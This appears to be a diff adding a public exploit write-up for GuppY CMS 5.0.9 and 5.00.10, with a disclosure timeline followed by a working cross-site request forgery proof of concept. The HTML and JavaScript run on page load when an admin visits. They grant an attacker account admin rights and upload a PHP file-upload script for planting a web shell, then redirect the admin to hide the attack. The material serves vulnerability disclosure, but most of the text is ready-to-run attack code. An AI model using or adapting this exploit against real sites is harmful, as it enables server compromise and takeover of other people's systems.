@@ -1,0 +1,80 @@
+<!--
+Exploit Title: GuppY CMS 5.0.9 & 5.00.10 Multiple CSRF Vulnerabilities-Privilege escalation/File upload. Other versions may be vulnerable but weren't tested.
+Date: 2/17/2015
+Exploit Author: Brandon Murphy
+Vendor Homepage: http://freeguppy.org
+Software Link: Windows-5.00.10 https://www.freeguppy.org/dwnld.php?lng=en&delay=5&pg=255317&li=CeCILL
+Version: 5.0.9 & 5.00.10
+Tested on: Windows 7/Firefox & Xubuntu Linux 3.2.0-23-generic
+Xubuntu - Guppy CMS 5.00.10 VM: http://mediafire.com/download/d85mgobb35mblzb/GUPPY5.0.7z Working on Virtualbox & VMWare Workstation - VM by d1ch4do
+Username:xubuntu Pass:reverse
+
+Timeline:
+12/21/2014 Notified vendor of vulnerability.
+12/21/2014 Vendor replied requesting information.
+12/22/2014 Vendor notified of another vulnerability. Supplied both exploits/info.
+12/23/2014 Vendor replied problem identified. I was told that I would be supplied with corrections when patch is ready.
+12/23/2014 Acknowledged. Told vendor full disclosure will be released 45 days after patch release.
+12/29/2014 Vendor releases 5.00.10. Countdown begins.
+1/1/2015 Vendor notified the vulnerabilities still exist in patched version 5.00.10
+1/2/2015 Vendor supplied with version 2 exploits.
+2/17/2015 Public Disclosure. Was delayed due to holiday.
+
+Exploit Description: 
+Stable with Firefox 34.0.5. Other browsers may be unstable or may not work. When an authenticated admin is exposed to the code below it will do a couple things. "CSRF 1" allows a registered user to escalate their privileges to Collaborator Admin with access to the "files" plugin. This will allow the attacker to upload a php shell to compromise the server. Once executed the attacker would log into the website as normal then proceed to site.com/admin where it greets them with "AttackerName, enter your password :" and login with the same password you registered with. Hover over "General Management" and then click "Files" where the you can upload a shell of your choosing.
+
+"CSRF 2" As stated earlier the admin has to be authenticated for this to work.  However, the attacker doesn't need an account for "CSRF 2" to work. If the attacker does have an account "CSRF 1" and "CSRF 2" are both automatically executed when the page is loaded giving them 2 ways in. All that is needed on the attacker's end is to go to site.com/file/up.php, upload your shell and access it at site.com/file/shell_name.php The admin must have access to the "files" plugin.
+
+Thanks: Fred, d1ch4do, & to all of the people who don't believe in me.
+
+My LinkedIn: https://linkedin.com/in/brandonm86
+
+Disclaimer:
+I cannot be held accountable for anything you do with this exploit. You take responsibility for your own actions. For educational and testing purposes only.
+-->
+
+<!-- CSRF 1 start - Escalate attacker privileges to Collaborator Admin with the ability to upload unrestricted files (A shell). -->
+<html>
+  <body onload="document.forms[0].submit(); redirect(); submitRequest()">
+    <form action="http://site.com/admin/admin.php?lng=en&pg=attribdroits" method="POST">
+      <input type="hidden" name="namedroits" value="TestUser"/> <!-- Attacker user name. You must register this user first! -->
+      <input type="hidden" name="etape" value="3"/>
+      <input type="hidden" name="drtuser38" value="5f4dcc3b5aa765d61d8327deb882cf99"/> <!-- Attacker password md5 hash. -->
+      <input type="hidden" name="drtuser42" value="admin"/> <!-- Your rights to be granted. Leave me alone! -->
+      <input type="hidden" name="drtuser30" value=""/>
+      <input type="hidden" name="drtuser36" value="on"/>
+      <input type="hidden" name="listplug" value="files"/> <!-- The plugin you will grant yourself access to. -->
+    </form>
+	<script>
+    function redirect(){
+       window.location.href = "http://site.com/index.php"; <!-- Redirect admin to somewhere else after the CSRF takes place or he/she would know the jig is up. -->
+    }
+	<!-- End CSRF 1 -->
+	<!-- CSRF 2 start - Uploads a small upload script that can then be used to upload your favorite shell. Go to site.com/file/up.php then upload your shell. -->
+    function submitRequest()
+    {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://site.com/admin/admin.php?lng=en&pg=upload", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------221361792726389");
+        xhr.withCredentials = true;
+        var body = "-----------------------------221361792726389\r\n" + 
+          "Content-Disposition: form-data; name=\"rep\"\r\n" + 
+          "\r\n" + 
+          "file\r\n" + 
+          "-----------------------------221361792726389\r\n" + 
+          "Content-Disposition: form-data; name=\"ficup\"; filename=\"up.php\"\r\n" + <!-- Name your php upload script here. -->
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\x3cform method=\"post\" action=\"\" enctype=\"multipart/form-data\"\x3e\x3cinput type=\"file\" name=\"myfile\"\x3e\x3cinput type=\"submit\"   value=\"Upload\"\x3e\x3c/form\x3e\x3c?PHP $dir = \"./\"; $path = $_FILES[\"myfile\"][\"tmp_name\"]; $name = $_FILES[\"myfile\"][\"name\"];if (move_uploaded_file($path, $dir . $name)){print \"file uploaded. You made it\";} else {print \"Error! No hacking today!\";} ?\x3e\r\n" +  
+          "-----------------------------221361792726389--\r\n"; <!-- Upload script by d1ch4do -->
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+    }
+    </script>
+	<!-- Ending CSRF -->
+  </body>
+</html>
